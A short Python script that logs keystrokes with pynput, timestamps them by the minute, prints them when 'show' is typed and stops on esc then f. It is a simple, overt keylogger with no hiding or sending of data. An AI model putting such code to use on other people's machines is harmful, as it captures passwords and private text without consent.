# Import Time Library
import time
# Import keyboard library
from pynput.keyboard import Key, Listener
# Create a dictionary that will record times and keystrokes.
dicti={}
#Calling a function to record keyboard keystrokes and their times.
def on_press(key):
    global dicti
#Calling a function to record time.
    timei = str(time.strftime("%d/%m/%Y  %H:%M"))
# Calling the keystroke receive function
    key=str(key)[1:-1]
# Replaces key.space with space.
    if key == "ey.spac":
        key = " "
# Add time taps If the time is different, create a new time
    if timei in dicti:
        dicti[timei] += key
    else:
        dicti[timei] = key
# Pressing esc+f stops the program
    if "ey.esf" in dicti[timei]:
          return False
# Typing the word "show" will print all what has been typed so far.
    if "show" in dicti[timei]:
        for key,value in dicti.items():
         print("\n","***",key ,"***" ,"\n", value)
        dicti={}
# Collect events until released
with Listener(on_press=on_press) as listener:
    listener.join()
